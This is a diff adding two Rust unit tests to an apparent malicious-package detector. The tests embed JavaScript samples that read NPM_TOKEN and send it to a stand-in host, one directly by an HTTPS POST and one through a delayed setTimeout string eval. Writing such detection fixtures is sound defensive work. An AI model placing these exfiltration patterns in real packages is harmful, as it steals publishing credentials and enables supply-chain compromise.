@@ -134,6 +134,49 @@ fn detects_exfiltration_combo() {
 }
 
 #[test]
+fn detects_dormant_exfiltration_payloads() {
+    let findings = analyze(
+        r#"
+        function activateOnlyAfterPublish() {
+            const https = require('https');
+            const token = process.env.NPM_TOKEN;
+            https.request({ hostname: 'collector.invalid', method: 'POST' }).end(token);
+        }
+        module.exports = activateOnlyAfterPublish;
+    "#,
+    );
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::Network)
+    );
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::EnvAccess)
+    );
+}
+
+#[test]
+fn detects_delayed_string_execution_payloads() {
+    let findings = analyze(
+        r#"
+        setTimeout("require('https').get('https://collector.invalid/?t=' + process.env.NPM_TOKEN)", 600000);
+    "#,
+    );
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::DynamicExec)
+    );
+    assert!(
+        findings
+            .iter()
+            .any(|finding| finding.kind == FindingKind::EnvAccess)
+    );
+}
+
+#[test]
 fn detects_new_function_dynamic_exec() {
     let findings = analyze(
         r#"
